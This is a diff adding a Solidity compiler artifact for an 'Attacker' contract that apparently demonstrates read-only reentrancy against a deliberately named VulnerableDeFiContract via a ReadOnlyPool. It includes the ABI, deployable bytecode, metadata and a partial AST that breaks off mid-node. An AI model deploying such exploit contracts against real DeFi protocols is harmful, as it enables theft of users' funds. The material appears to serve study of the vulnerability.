@@ -1,0 +1,833 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract ReadOnlyPool",
+          "name": "_pool",
+          "type": "address"
+        },
+        {
+          "internalType": "contract VulnerableDeFiContract",
+          "name": "_defi",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "bytecode": {
+    "object": "0x60806040526040516102573803806102578339810160408190526100229161006b565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100a5565b6001600160a01b038116811461006857600080fd5b50565b6000806040838503121561007e57600080fd5b825161008981610053565b602084015190925061009a81610053565b809150509250929050565b6101a3806100b46000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461009257600080fd5b3661008d57600160009054906101000a90046001600160a01b03166001600160a01b031663fb76f7086040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561007757600080fd5b505af115801561008b573d6000803e3d6000fd5b005b600080fd5b34801561009e57600080fd5b5061008b60008054906101000a90046001600160a01b03166001600160a01b031663e8078d94671bc16d674ec800006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505060008054604080516333dcd14360e11b815290516001600160a01b0390921695506367b9a2869450600480820194509082900301818387803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b5050505056fea2646970667358221220cd37eea72e4784cee5412111def0ab18c60abfe0c1f505c81dcd85ce2d12b98264736f6c634300080f0033",
+    "sourceMap": "91:391:28:-:0;;;172:121;;;;;;;;;;;;;;;;;;:::i;:::-;252:4;:12;;-1:-1:-1;;;;;252:12:28;;;-1:-1:-1;;;;;;252:12:28;;;;;;;;274;;;;;;;;;;;91:391;;14:145:31;-1:-1:-1;;;;;103:31:31;;93:42;;83:70;;149:1;146;139:12;83:70;14:145;:::o;164:467::-;297:6;305;358:2;346:9;337:7;333:23;329:32;326:52;;;374:1;371;364:12;326:52;406:9;400:16;425:45;464:5;425:45;:::i;:::-;539:2;524:18;;518:25;489:5;;-1:-1:-1;552:47:31;518:25;552:47;:::i;:::-;618:7;608:17;;;164:467;;;;;:::o;:::-;91:391:28;;;;;;",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x6080604052600436106100225760003560e01c80639e5faafc1461009257600080fd5b3661008d57600160009054906101000a90046001600160a01b03166001600160a01b031663fb76f7086040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561007757600080fd5b505af115801561008b573d6000803e3d6000fd5b005b600080fd5b34801561009e57600080fd5b5061008b60008054906101000a90046001600160a01b03166001600160a01b031663e8078d94671bc16d674ec800006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505060008054604080516333dcd14360e11b815290516001600160a01b0390921695506367b9a2869450600480820194509082900301818387803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b5050505056fea2646970667358221220cd37eea72e4784cee5412111def0ab18c60abfe0c1f505c81dcd85ce2d12b98264736f6c634300080f0033",
+    "sourceMap": "91:391:28:-:0;;;;;;;;;;;;;;;;;;;;;;;;453:4;;;;;;;;;-1:-1:-1;;;;;453:4:28;-1:-1:-1;;;;;453:18:28;;:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;91:391;;;;299:111;;;;;;;;;;;;336:4;;;;;;;;-1:-1:-1;;;;;336:4:28;-1:-1:-1;;;;;336:17:28;;361:7;336:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;381:4:28;;;:22;;;-1:-1:-1;;;381:22:28;;;;-1:-1:-1;;;;;381:4:28;;;;-1:-1:-1;381:20:28;;-1:-1:-1;381:22:28;;;;;-1:-1:-1;381:22:28;;;;;;:4;;:22;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;299:111::o",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "attack()": "9e5faafc"
+  },
+  "rawMetadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract ReadOnlyPool\",\"name\":\"_pool\",\"type\":\"address\"},{\"internalType\":\"contract VulnerableDeFiContract\",\"name\":\"_defi\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ds-test/=lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol\":{\"keccak256\":\"0x190dd6f8d592b7e4e930feb7f4313aeb8e1c4ad3154c27ce1cf6a512fc30d8cc\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4ce8dfb62d0c4fa260d6eec8f1cd47f5f2a044e11bde5b31d18072fa6e7d9010\",\"dweb:/ipfs/QmTyFztU3tLEcEDnqqiaW4UJetqsU77LXc6pjc9oTXCK5u\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d\",\"dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"keccak256\":\"0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd\",\"dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8\"]},\"lib/openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\":{\"keccak256\":\"0xd072bae157dbfae22652801c8811296d7b3311d0432407fbd4d2e961eac63f0a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://607b2aabf33cfa043ae1b6f0c7dca80718d440e6d980c6afac734851c69ede75\",\"dweb:/ipfs/QmPGzMcypjgArPY4PUKbgJcVh5m9aZKos6bxbTwzZHyDVn\"]},\"lib/openzeppelin-contracts/contracts/token/ERC777/IERC777.sol\":{\"keccak256\":\"0x385a7061f1436b079d44c140dee9387d5313e94874ff9ee877dc0085c981ac3d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1c3fe22bb0d9527356e11f267f9187134de4d4ed1ff77468b4d73e3238697b96\",\"dweb:/ipfs/Qmc8caJctgxbzXEpxRogQMR2bnBk5U67hA7kKbUEG2PUXV\"]},\"lib/openzeppelin-contracts/contracts/token/ERC777/IERC777Recipient.sol\":{\"keccak256\":\"0x1a5d61db2733202ba361e6d6741cd2e662380e22b80e987eacfc91973f2267dc\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://04c0cd697050a6516b7779aa2343ad2d0e5217d8915ac2382681dfdf4e445be3\",\"dweb:/ipfs/QmPCBCZgm7pHBwwogE2F9NCN3UfTdLNhqc8UDEvw8kDzyA\"]},\"lib/openzeppelin-contracts/contracts/token/ERC777/IERC777Sender.sol\":{\"keccak256\":\"0x742e51d63b108240759794360637468d9fcbf072cbd357744790d356a87bb382\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://23912910ce2bb68e49ff83f43fcfa864210ee44580491e876db14922f8aecc18\",\"dweb:/ipfs/QmU6GnRQ51xvY8D57kPCV47oGeYozaz5AQZUCHxFfXdFZ4\"]},\"lib/openzeppelin-contracts/contracts/utils/Address.sol\":{\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://ec772b45a624be516f1c81970caa8a2e144301e9d0921cbc1a2789fef39a1269\",\"dweb:/ipfs/QmNyjwxCrGhQMyzLD93oUobJXVe9ceJvRvfXwbEtuxPiEj\"]},\"lib/openzeppelin-contracts/contracts/utils/Context.sol\":{\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92\",\"dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3\"]},\"lib/openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\":{\"keccak256\":\"0xd750324b0fc76aa4c1b0aadf7cab03b3d1cc4d5744348c18ba2b99dbdbe1758d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d53cbf8e2e469a6422fb61d8636af3ec39d8e10e7f4d99d625bdd36d4b8ddf34\",\"dweb:/ipfs/QmNhvk3jmfgquVki2V7gNmTWTMeNwEPCnetybeBntQtsyJ\"]},\"src/Attacker.sol\":{\"keccak256\":\"0x33f5e0cc48568e970f04a9355eb857407e6c48cccee7f080b73029e819c0dabc\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://a4a2b025c80c2a59c0e205fb168189e08d4e44b78f4d3b3173fa81d818963ee5\",\"dweb:/ipfs/Qmahg2Sy7q8BvCuXVKExEpddkmbsN4eyu3MgJFV1nQjaoe\"]},\"src/ReadOnly.sol\":{\"keccak256\":\"0xc297f5853eb074aad4416e5496f64444527a2c979433ce1a229415b58d679feb\",\"license\":\"GPL-3.0\",\"urls\":[\"bzz-raw://5368e416fd95176e43c8f8bcb343ac6933ac555615a635afc686abd9c3b8ba4c\",\"dweb:/ipfs/QmXcimkUR64fi1yYCByFgjXv5eu1P1emjeFQjuYKnNpTCd\"]}},\"version\":1}",
+  "metadata": {
+    "compiler": {
+      "version": "0.8.15+commit.e14f2714"
+    },
+    "language": "Solidity",
+    "output": {
+      "abi": [
+        {
+          "inputs": [
+            {
+              "internalType": "contract ReadOnlyPool",
+              "name": "_pool",
+              "type": "address"
+            },
+            {
+              "internalType": "contract VulnerableDeFiContract",
+              "name": "_defi",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "payable",
+          "type": "constructor"
+        },
+        {
+          "inputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function",
+          "name": "attack"
+        },
+        {
+          "inputs": [],
+          "stateMutability": "payable",
+          "type": "receive"
+        }
+      ],
+      "devdoc": {
+        "kind": "dev",
+        "methods": {},
+        "version": 1
+      },
+      "userdoc": {
+        "kind": "user",
+        "methods": {},
+        "version": 1
+      }
+    },
+    "settings": {
+      "remappings": [
+        ":ds-test/=lib/forge-std/lib/ds-test/src/",
+        ":erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/",
+        ":forge-std/=lib/forge-std/src/",
+        ":openzeppelin-contracts/=lib/openzeppelin-contracts/"
+      ],
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "metadata": {
+        "bytecodeHash": "ipfs"
+      },
+      "compilationTarget": {
+        "src/Attacker.sol": "Attacker"
+      },
+      "libraries": {}
+    },
+    "sources": {
+      "lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol": {
+        "keccak256": "0x190dd6f8d592b7e4e930feb7f4313aeb8e1c4ad3154c27ce1cf6a512fc30d8cc",
+        "urls": [
+          "bzz-raw://4ce8dfb62d0c4fa260d6eec8f1cd47f5f2a044e11bde5b31d18072fa6e7d9010",
+          "dweb:/ipfs/QmTyFztU3tLEcEDnqqiaW4UJetqsU77LXc6pjc9oTXCK5u"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol": {
+        "keccak256": "0x4ffc0547c02ad22925310c585c0f166f8759e2648a09e9b489100c42f15dd98d",
+        "urls": [
+          "bzz-raw://15f52f51413a9de1ff191e2f6367c62178e1df7806d7880fe857a98b0b66253d",
+          "dweb:/ipfs/QmaQG1fwfgUt5E9nu2cccFiV47B2V78MM1tCy1qB7n4MsH"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol": {
+        "keccak256": "0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b",
+        "urls": [
+          "bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34",
+          "dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
+        "keccak256": "0x8de418a5503946cabe331f35fe242d3201a73f67f77aaeb7110acb1f30423aca",
+        "urls": [
+          "bzz-raw://5a376d3dda2cb70536c0a45c208b29b34ac560c4cb4f513a42079f96ba47d2dd",
+          "dweb:/ipfs/QmZQg6gn1sUpM8wHzwNvSnihumUCAhxD119MpXeKp8B9s8"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC777/ERC777.sol": {
+        "keccak256": "0xd072bae157dbfae22652801c8811296d7b3311d0432407fbd4d2e961eac63f0a",
+        "urls": [
+          "bzz-raw://607b2aabf33cfa043ae1b6f0c7dca80718d440e6d980c6afac734851c69ede75",
+          "dweb:/ipfs/QmPGzMcypjgArPY4PUKbgJcVh5m9aZKos6bxbTwzZHyDVn"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC777/IERC777.sol": {
+        "keccak256": "0x385a7061f1436b079d44c140dee9387d5313e94874ff9ee877dc0085c981ac3d",
+        "urls": [
+          "bzz-raw://1c3fe22bb0d9527356e11f267f9187134de4d4ed1ff77468b4d73e3238697b96",
+          "dweb:/ipfs/Qmc8caJctgxbzXEpxRogQMR2bnBk5U67hA7kKbUEG2PUXV"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC777/IERC777Recipient.sol": {
+        "keccak256": "0x1a5d61db2733202ba361e6d6741cd2e662380e22b80e987eacfc91973f2267dc",
+        "urls": [
+          "bzz-raw://04c0cd697050a6516b7779aa2343ad2d0e5217d8915ac2382681dfdf4e445be3",
+          "dweb:/ipfs/QmPCBCZgm7pHBwwogE2F9NCN3UfTdLNhqc8UDEvw8kDzyA"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/token/ERC777/IERC777Sender.sol": {
+        "keccak256": "0x742e51d63b108240759794360637468d9fcbf072cbd357744790d356a87bb382",
+        "urls": [
+          "bzz-raw://23912910ce2bb68e49ff83f43fcfa864210ee44580491e876db14922f8aecc18",
+          "dweb:/ipfs/QmU6GnRQ51xvY8D57kPCV47oGeYozaz5AQZUCHxFfXdFZ4"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Address.sol": {
+        "keccak256": "0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1",
+        "urls": [
+          "bzz-raw://ec772b45a624be516f1c81970caa8a2e144301e9d0921cbc1a2789fef39a1269",
+          "dweb:/ipfs/QmNyjwxCrGhQMyzLD93oUobJXVe9ceJvRvfXwbEtuxPiEj"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/Context.sol": {
+        "keccak256": "0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7",
+        "urls": [
+          "bzz-raw://6df0ddf21ce9f58271bdfaa85cde98b200ef242a05a3f85c2bc10a8294800a92",
+          "dweb:/ipfs/QmRK2Y5Yc6BK7tGKkgsgn3aJEQGi5aakeSPZvS65PV8Xp3"
+        ],
+        "license": "MIT"
+      },
+      "lib/openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol": {
+        "keccak256": "0xd750324b0fc76aa4c1b0aadf7cab03b3d1cc4d5744348c18ba2b99dbdbe1758d",
+        "urls": [
+          "bzz-raw://d53cbf8e2e469a6422fb61d8636af3ec39d8e10e7f4d99d625bdd36d4b8ddf34",
+          "dweb:/ipfs/QmNhvk3jmfgquVki2V7gNmTWTMeNwEPCnetybeBntQtsyJ"
+        ],
+        "license": "MIT"
+      },
+      "src/Attacker.sol": {
+        "keccak256": "0x33f5e0cc48568e970f04a9355eb857407e6c48cccee7f080b73029e819c0dabc",
+        "urls": [
+          "bzz-raw://a4a2b025c80c2a59c0e205fb168189e08d4e44b78f4d3b3173fa81d818963ee5",
+          "dweb:/ipfs/Qmahg2Sy7q8BvCuXVKExEpddkmbsN4eyu3MgJFV1nQjaoe"
+        ],
+        "license": "GPL-3.0"
+      },
+      "src/ReadOnly.sol": {
+        "keccak256": "0xc297f5853eb074aad4416e5496f64444527a2c979433ce1a229415b58d679feb",
+        "urls": [
+          "bzz-raw://5368e416fd95176e43c8f8bcb343ac6933ac555615a635afc686abd9c3b8ba4c",
+          "dweb:/ipfs/QmXcimkUR64fi1yYCByFgjXv5eu1P1emjeFQjuYKnNpTCd"
+        ],
+        "license": "GPL-3.0"
+      }
+    },
+    "version": 1
+  },
+  "ast": {
+    "absolutePath": "src/Attacker.sol",
+    "id": 31650,
+    "exportedSymbols": {
+      "Address": [
+        31484
+      ],
+      "Attacker": [
+        31649
+      ],
+      "Context": [
+        31506
+      ],
+      "ERC20": [
+        29757
+      ],
+      "ERC777": [
+        30951
+      ],
+      "IERC1820Registry": [
+        31596
+      ],
+      "IERC20": [
+        29835
+      ],
+      "IERC20Metadata": [
+        29860
+      ],
+      "IERC777": [
+        31114
+      ],
+      "IERC777Recipient": [
+        31134
+      ],
+      "IERC777Sender": [
+        31154
+      ],
+      "ReadOnlyPool": [
+        31797
+      ],
+      "ReentrancyGuard": [
+        29170
+      ],
+      "VulnerableDeFiContract": [
+        31683
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "35:448:28",
+    "nodes": [
+      {
+        "id": 31598,
+        "nodeType": "PragmaDirective",
+        "src": "35:23:28",
+        "nodes": [],
+        "literals": [
+          "solidity",
+          "0.8",
+          ".15"
+        ]
+      },
+      {
+        "id": 31599,
+        "nodeType": "ImportDirective",
+        "src": "60:29:28",
+        "nodes": [],
+        "absolutePath": "src/ReadOnly.sol",
+        "file": "../src/ReadOnly.sol",
+        "nameLocation": "-1:-1:-1",
+        "scope": 31650,
+        "sourceUnit": 31798,
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "id": 31649,
+        "nodeType": "ContractDefinition",
+        "src": "91:391:28",
+        "nodes": [
+          {
+            "id": 31602,
+            "nodeType": "VariableDeclaration",
+            "src": "115:17:28",
+            "nodes": [],
+            "constant": false,
+            "mutability": "mutable",
+            "name": "pool",
+            "nameLocation": "128:4:28",
+            "scope": 31649,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+              "typeString": "contract ReadOnlyPool"
+            },
+            "typeName": {
+              "id": 31601,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 31600,
+                "name": "ReadOnlyPool",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 31797,
+                "src": "115:12:28"
+              },
+              "referencedDeclaration": 31797,
+              "src": "115:12:28",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                "typeString": "contract ReadOnlyPool"
+              }
+            },
+            "visibility": "internal"
+          },
+          {
+            "id": 31605,
+            "nodeType": "VariableDeclaration",
+            "src": "138:27:28",
+            "nodes": [],
+            "constant": false,
+            "mutability": "mutable",
+            "name": "defi",
+            "nameLocation": "161:4:28",
+            "scope": 31649,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+              "typeString": "contract VulnerableDeFiContract"
+            },
+            "typeName": {
+              "id": 31604,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 31603,
+                "name": "VulnerableDeFiContract",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 31683,
+                "src": "138:22:28"
+              },
+              "referencedDeclaration": 31683,
+              "src": "138:22:28",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                "typeString": "contract VulnerableDeFiContract"
+              }
+            },
+            "visibility": "internal"
+          },
+          {
+            "id": 31623,
+            "nodeType": "FunctionDefinition",
+            "src": "172:121:28",
+            "nodes": [],
+            "body": {
+              "id": 31622,
+              "nodeType": "Block",
+              "src": "242:51:28",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "id": 31616,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 31614,
+                      "name": "pool",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 31602,
+                      "src": "252:4:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                        "typeString": "contract ReadOnlyPool"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 31615,
+                      "name": "_pool",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 31608,
+                      "src": "259:5:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                        "typeString": "contract ReadOnlyPool"
+                      }
+                    },
+                    "src": "252:12:28",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                      "typeString": "contract ReadOnlyPool"
+                    }
+                  },
+                  "id": 31617,
+                  "nodeType": "ExpressionStatement",
+                  "src": "252:12:28"
+                },
+                {
+                  "expression": {
+                    "id": 31620,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 31618,
+                      "name": "defi",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 31605,
+                      "src": "274:4:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                        "typeString": "contract VulnerableDeFiContract"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "id": 31619,
+                      "name": "_defi",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 31611,
+                      "src": "281:5:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                        "typeString": "contract VulnerableDeFiContract"
+                      }
+                    },
+                    "src": "274:12:28",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                      "typeString": "contract VulnerableDeFiContract"
+                    }
+                  },
+                  "id": 31621,
+                  "nodeType": "ExpressionStatement",
+                  "src": "274:12:28"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 31612,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 31608,
+                  "mutability": "mutable",
+                  "name": "_pool",
+                  "nameLocation": "197:5:28",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 31623,
+                  "src": "184:18:28",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                    "typeString": "contract ReadOnlyPool"
+                  },
+                  "typeName": {
+                    "id": 31607,
+                    "nodeType": "UserDefinedTypeName",
+                    "pathNode": {
+                      "id": 31606,
+                      "name": "ReadOnlyPool",
+                      "nodeType": "IdentifierPath",
+                      "referencedDeclaration": 31797,
+                      "src": "184:12:28"
+                    },
+                    "referencedDeclaration": 31797,
+                    "src": "184:12:28",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                      "typeString": "contract ReadOnlyPool"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 31611,
+                  "mutability": "mutable",
+                  "name": "_defi",
+                  "nameLocation": "227:5:28",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 31623,
+                  "src": "204:28:28",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                    "typeString": "contract VulnerableDeFiContract"
+                  },
+                  "typeName": {
+                    "id": 31610,
+                    "nodeType": "UserDefinedTypeName",
+                    "pathNode": {
+                      "id": 31609,
+                      "name": "VulnerableDeFiContract",
+                      "nodeType": "IdentifierPath",
+                      "referencedDeclaration": 31683,
+                      "src": "204:22:28"
+                    },
+                    "referencedDeclaration": 31683,
+                    "src": "204:22:28",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_VulnerableDeFiContract_$31683",
+                      "typeString": "contract VulnerableDeFiContract"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "183:50:28"
+            },
+            "returnParameters": {
+              "id": 31613,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "242:0:28"
+            },
+            "scope": 31649,
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 31639,
+            "nodeType": "FunctionDefinition",
+            "src": "299:111:28",
+            "nodes": [],
+            "body": {
+              "id": 31638,
+              "nodeType": "Block",
+              "src": "326:84:28",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "argumentTypes": [],
+                        "expression": {
+                          "id": 31626,
+                          "name": "pool",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 31602,
+                          "src": "336:4:28",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                            "typeString": "contract ReadOnlyPool"
+                          }
+                        },
+                        "id": 31628,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "addLiquidity",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": 31718,
+                        "src": "336:17:28",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
+                          "typeString": "function () payable external"
+                        }
+                      },
+                      "id": 31630,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "names": [
+                        "value"
+                      ],
+                      "nodeType": "FunctionCallOptions",
+                      "options": [
+                        {
+                          "hexValue": "32",
+                          "id": 31629,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "kind": "number",
+                          "lValueRequested": false,
+                          "nodeType": "Literal",
+                          "src": "361:7:28",
+                          "subdenomination": "ether",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_rational_2000000000000000000_by_1",
+                            "typeString": "int_const 2000000000000000000"
+                          },
+                          "value": "2"
+                        }
+                      ],
+                      "src": "336:33:28",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
+                        "typeString": "function () payable external"
+                      }
+                    },
+                    "id": 31631,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "336:35:28",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 31632,
+                  "nodeType": "ExpressionStatement",
+                  "src": "336:35:28"
+                },
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "id": 31633,
+                        "name": "pool",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 31602,
+                        "src": "381:4:28",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_ReadOnlyPool_$31797",
+                          "typeString": "contract ReadOnlyPool"
+                        }
+                      },
+                      "id": 31635,
